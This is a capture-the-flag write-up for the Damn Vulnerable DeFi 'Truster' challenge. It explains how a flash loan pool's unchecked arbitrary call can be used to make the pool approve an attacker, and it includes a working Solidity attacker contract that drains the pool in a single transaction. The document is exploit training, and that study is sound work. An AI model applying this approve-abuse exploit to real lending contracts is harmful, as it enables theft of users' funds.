# Truster — attack

## hypothesis

The `flashLoan` function lets the caller pick both what to call and what to say — and the pool makes that call as itself. So I can trick the pool into calling `approve` on the token, giving myself permission to spend all its DVT. Once I have the approval, I just pull the tokens out with `transferFrom`.

## preconditions

- Pool has 1,000,000 DVT sitting in it.
- `flashLoan` is open to anyone — no access control.
- I fully control `target` and `data`.
- The pool is the one executing the internal call, so it becomes `msg.sender`.
- I only get one transaction, so I need to bundle everything into a constructor.

## attack steps (english first)

1. Write an attacker contract. Put the whole exploit in its constructor.
2. In the constructor, check how many tokens the pool has.
3. Build the "approve me for all of it" message as calldata.
4. Call `flashLoan` with amount = 0, target = token, data = the approve message.
   - Pool runs the approve on the token, as itself → I now have permission to spend its DVT.
5. Call `transferFrom` to move all the pool's tokens to the recovery address.
6. Deploy the contract. That single deployment = one transaction = pool drained.

## why each step works

- **Borrowing zero tokens** — the pool checks it wasn't left short. If I never took anything, there's nothing to pay back. Check passes.
- **Pool calls approve as itself** — inside `functionCall`, the pool is the one talking to the token. So the token thinks the pool is the one saying "let this attacker spend my DVT."
- **The check doesn't catch approvals** — the pool only checks its balance. An approval doesn't move any tokens, so the balance is unchanged and the check has nothing to complain about.
- **transferFrom finishes the job** — now that the pool has approved me, I can move its tokens wherever I want. I send them to recovery.
- **Constructor = one transaction** — deploying a contract counts as one transaction, and whatever runs in the constructor runs as part of it. That keeps me under the one-tx limit.

## poc

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TrusterAttacker {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolBalance
        );

        pool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(pool), recovery, poolBalance);
    }
}
```

Trigger in the test:

```solidity
function test_truster() public checkSolvedByPlayer {
    new TrusterAttacker(pool, token, recovery);
}
```

## summary

The pool lets the caller decide what call to make, and makes it as itself. So I made it approve me for its full balance, then pulled the tokens out with `transferFrom`. Everything sits in a constructor, so one deployment does the whole job.

## diagram

START (0 DVT, 0 ETH)
│
↓
Deploy TrusterAttacker (one tx)
│
↓
Constructor runs:
│
├── read pool balance
├── build data = approve(attacker, poolBalance)
├── call pool.flashLoan(0, self, token, data)
│ └── pool calls token.approve(attacker, poolBalance) as itself
│ → allowance set
│ → balance check passes (nothing moved)
│
└── call token.transferFrom(pool, recovery, poolBalance)
→ tokens drain from pool to recovery
│
↓
POOL EMPTY → recovery holds 1,000,000 DVT ✅
